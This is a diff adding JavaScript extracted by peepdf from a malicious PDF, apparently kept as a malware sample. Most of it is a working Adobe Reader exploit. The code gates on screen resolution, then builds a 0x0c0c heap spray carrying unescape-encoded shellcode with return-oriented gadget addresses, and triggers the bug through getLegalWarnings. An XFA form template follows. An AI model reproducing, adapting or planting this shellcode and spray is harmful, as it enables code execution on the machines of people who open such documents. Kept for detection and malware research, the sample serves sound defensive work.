@@ -1,0 +1,72 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+var flag = 0;
+// the first call initializes the obj!
+app.monitors.toSource();
+var mon_arr = app.monitors[0].rect.toString().split(",")
+var width = 0,
+    height = 0;
+for (var i in mon_arr) {
+    mon_arr[i] = Math.abs(parseInt(mon_arr[i]));
+    if (mon_arr[i] > 0 && width == 0) width = mon_arr[i];
+    else if (mon_arr[i] > 0 && width > 0) height = mon_arr[i];
+}
+// proceed only if the values are set.
+if (width > 0 && height > 0) {
+    var arr = "<1920x1200".split(",");
+    for (var i in arr) {
+        arr[i] = arr[i].toLowerCase().replace(/ /g, '');
+        if (
+        arr[i] == "portrait" && height > width) {
+            flag = 1;
+            break;
+        }
+        if (arr[i].indexOf(">=") >= 0) {
+            if ((width >= parseInt(arr[i].split(">=")[1].split("x")[0])) && (height >= parseInt(arr[i].split(">=")[1].split("x")[1]))) {
+                flag = 1;
+                break;
+            }
+        } else if (arr[i].indexOf(">") >= 0) {
+            if ((width > parseInt(arr[i].split(">")[1].split("x")[0])) && (height > parseInt(arr[i].split(">")[1].split("x")[1]))) {
+                flag = 1;
+                break;
+            }
+        }
+        if (arr[i].indexOf("<=") >= 0) {
+            if ((width <= parseInt(arr[i].split("<=")[1].split("x")[0])) && (height <= parseInt(arr[i].split("<=")[1].split("x")[1]))) {
+                flag = 1;
+                break;
+            }
+        } else if (arr[i].indexOf("<") >= 0) {
+            if ((width < parseInt(arr[i].split("<")[1].split("x")[0])) && (height < parseInt(arr[i].split("<")[1].split("x")[1]))) {
+                flag = 1;
+                break;
+            }
+        }
+    }
+}
+if (flag) {
+
+    var shellcode = unescape("%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uc7db%u74d9%uf424%u335d%ub1c9%ub836%u1535%u8fb3%ued83%u31fc%u1445%u4503%uf721%u3446%u0406%ufeab%u3b42%u7475%u4856%u5ede%u015f%u91f0%u7607%u3a8c%u754b%uaaca%u7c1e%u9715%u68d3%ub6e9%u0bc0%u690f%udc35%ue9a2%ubf5a%u3a1f%u7114%ue5b0%uefd8%ueae7%ue86a%u7ade%u308c%u6ea7%u2da4%ua40d%ucf73%ud62a%u875e%u0284%ua882%u0fe8%u2abc%u8861%u572f%u41e0%uf221%uf0c9%u98f4%u558f%u4f64%u3228%u6926%u5a9b%u8c93%u34a9%u381d%ueb2a%u6394%u4df6%ub673%uf733%uaf23%ue4be%u4c55%ua9ae%u4014%u582d%ue424%udab8%u2947%u8395%uacf9%u267c%u07fe%u7c3d%ud6bf%uf727%u48db%u256f%u5ae8%u74cb%u115a%ud6fb%udd03%ue879%u7777%u1b7d%ud241%u0174%u88f3%ue808%uf712%u790f%u8de1%u9a03%u5284%u2ed9%u41a6%u26d2%u3d4a%u46a3%u86b9%udc78%uc68d%u1850%u7d44%u98e1%u915c%ue0cd");
+
+    var c = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+    while (c.length + 20 + 8 < 0x10000) c += c;
+    b = c.substring(0, (0x0c0c - 0x24) / 2);
+    b += shellcode;
+    b += c;
+    d = b.substring(0, 0x10000 / 2);
+    while (d.length < 0x80000) d += d;
+    var_3 = d.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
+    var var_4 = new Array();
+    for (i = 0; i < 0x1f0; i++) var_4[i] = var_3 + "s";
+
+    this.getLegalWarnings(true);
+}
+
+// peepdf comment: Javascript code located in object 8 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
